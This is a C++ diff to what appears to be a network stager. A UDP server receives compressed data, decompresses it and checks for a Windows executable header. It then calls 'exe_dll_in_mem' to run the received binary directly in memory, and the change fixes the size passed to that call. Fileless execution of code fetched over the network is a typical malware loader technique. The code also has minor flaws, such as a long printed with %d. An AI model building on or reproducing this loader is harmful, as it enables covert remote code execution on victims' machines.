@@ -162,7 +162,9 @@ int udp_server_clinet(int Port)
         //decompression ------------------------------------------------------------------------------------------
         //ToDo change decompression from file to buffer input
         //char* opBuf = new char[sizeof(Buffer)];
-        uziphelp(Buffer2, DecompressedBuffer, (Size/2));
+        long decompressed_size;
+        decompressed_size = uziphelp(Buffer2, DecompressedBuffer, (Size/2));
+        printf("decompressed size: %d", decompressed_size);
 		printf("Decompressed file:\n");
 		cout << DecompressedBuffer;
 		printf("\n");
@@ -171,19 +173,19 @@ int udp_server_clinet(int Port)
 
         if (DecompressedBuffer[0] == 77) {
             if (DecompressedBuffer[1] == 90) {
-                printf("Detected PE executable!");
+                printf("\n\nDetected PE executable!\n\n");
             }
         }
 
         /*
-        unsigned char rawData[big];
+        unsigned char rawData[Size];
         for (int i = 0; i < 36864; ++i) {
-            rawData[i] = optBuffer[i];
+            rawData[i] = DecompressedBuffer[i];
             printf("%02X", rawData[i]);
         }
         */
-        printf("\nsizeofRawData: %d\n", sizeof(DecompressedBuffer));
-        exe_dll_in_mem(DecompressedBuffer, 36864); //ToDo
+
+        exe_dll_in_mem(DecompressedBuffer, decompressed_size); //ToDo
 
 		//we should have done this earlier
 		free(Buffer);
